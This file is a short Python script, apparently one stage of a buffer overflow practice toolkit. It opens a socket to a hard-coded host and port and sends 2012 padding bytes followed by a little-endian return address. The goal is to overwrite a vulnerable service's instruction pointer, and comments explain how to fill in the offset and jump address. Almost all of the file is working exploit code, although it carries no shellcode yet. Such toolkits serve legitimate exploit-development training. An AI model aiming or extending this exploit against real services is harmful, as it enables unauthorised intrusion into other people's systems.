#!/usr/bin/python3
# 6module.py
# https://github.com/hungryrussian/bufferoverflowtoolkit

import sys, socket

ip = "192.168.1.120"
port = 9999
command = ""

# replace A multiplier with offset value found with pattern_offset.rb
# replace given address with the memory address to jump code in little endian format (reversed)
shellcode = "A"*2012 + "\xdf\x14\x50\x62"
string = command + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(bytes(string, "latin-1"))
    s.recv(1024)
    s.close()

except:
    print("Could not connect to server.")
    sys.exit()
